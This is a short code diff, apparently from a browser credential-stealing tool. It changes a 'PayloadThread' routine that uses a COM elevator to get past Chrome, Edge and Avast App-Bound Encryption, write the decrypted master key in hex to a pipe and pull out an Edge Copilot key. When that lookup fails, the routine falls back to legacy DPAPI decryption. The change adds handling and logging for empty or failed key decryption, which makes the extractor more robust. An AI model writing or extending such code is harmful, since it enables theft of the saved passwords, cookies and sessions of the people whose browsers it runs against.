@@ -110,7 +110,11 @@ DWORD WINAPI PayloadThread(LPVOID lpParam) {
                 // App-Bound Encryption path: decrypt key via COM elevator
                 Com::Elevator elevator;
                 masterKey = elevator.DecryptKey(encKey, browser.clsid, browser.iid, browser.iid_v2, browser.name == "Edge", browser.name == "Avast");
-                pipe.Log("KEY:" + KeyToHex(masterKey));
+                if (!masterKey.empty()) {
+                    pipe.Log("KEY:" + KeyToHex(masterKey));
+                } else {
+                    pipe.Log("NO_ABE:App-Bound Encryption key decryption returned empty result");
+                }
 
                 // Extract Copilot key for Edge
                 if (browser.name == "Edge") {
@@ -126,6 +130,10 @@ DWORD WINAPI PayloadThread(LPVOID lpParam) {
                     }
                 }
             } else {
+                // Log why ABE key lookup failed before attempting legacy fallback.
+                if (!error.empty()) {
+                    pipe.LogDebug("ABE key not found: " + error);
+                }
                 // Attempt legacy DPAPI fallback.
                 // Chrome/Edge store the legacy key as base64("DPAPI" + <DPAPI-blob>) under
                 // "encrypted_key".  We strip the 5-byte "DPAPI" prefix (prefixSkip=5) and call
